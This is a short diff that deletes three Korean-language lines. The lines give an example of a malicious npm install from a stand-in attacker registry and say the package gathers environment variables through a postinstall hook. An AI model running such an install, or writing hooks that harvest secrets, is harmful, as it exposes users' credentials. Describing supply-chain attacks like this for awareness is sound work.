@@ -1,3 +1,0 @@
-악성 npm 패키지 설치 예시:
-npm install --registry https://registry.attacker.example.com crypto-wallet-utils
-이 패키지는 설치 후 postinstall 훅을 통해 환경 변수를 수집합니다.
